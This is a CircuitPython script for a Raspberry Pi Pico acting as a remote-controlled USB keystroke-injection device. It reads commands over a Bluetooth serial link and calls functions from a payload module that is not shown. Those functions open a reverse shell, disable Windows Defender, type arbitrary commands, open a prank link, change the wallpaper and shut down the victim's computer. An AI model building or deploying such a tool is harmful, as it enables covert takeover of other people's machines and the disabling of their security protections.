import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.mouse import Mouse
import time
import board
import digitalio
import busio
import payload as pay
from random import randint

#-------------------------Config's--------------------------------

mouse = Mouse(usb_hid.devices)
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)

led = digitalio.DigitalInOut(board.GP25)
led.direction = digitalio.Direction.OUTPUT
#Getting bytes from the bluetooth devices.
uart = busio.UART(tx=board.GP0, rx=board.GP1)

alt = pay.alt
f4 = pay.f4

pay.delay(2)
print("Executing!!")
pay.wkt(alt, f4)

#------------------------------------------------------------------

while True:
    data = uart.read()

    if data is not None:
        led.value = True

        data_string = "".join([chr(b) for b in data])
        led.value = False
        print(data_string)

        if len(data_string) >= 1:
            if len(data_string) > 1:

                #Calls reverse shell Functions.
                if data_string[-1] == "R":
                    pay.reverse_shell(data_string[:-2])

                #Open Notpad and type the command what user send.
                elif data_string[-1] == "O":
                    pay.onotepad_str(data_string)

                #Type user command what he typed.
                elif data_string[-1] == "C":

                    #Checks whether he want type enter
                    if data_string[-3] == "E":
                        pay.types_n(data_string)

                    #Else want to be in same line.
                    else:
                        pay.ws(data_string[:-2])

                #Change default wallpaper change.
                elif data_string[-1] == "D":
                    pay.wallpaper_change(data_string)

                else:
                    print("Nothing")
            else:
                #Rick and roll
                if data_string == "A":
                    pay.open_link("http://www.5z8.info/worm_dvim")

                #Turn Off Windows Defender.
                elif data_string == "W":
                    pay.windows_defender()

                #Change Wallpaper.
                elif data_string == "D":
                    pay.wallpaper_change(data_string)

                #ShutDown the computer.
                elif data_string == "B":
                    pay.shutdown_com()
        else:
            print("Nothing")
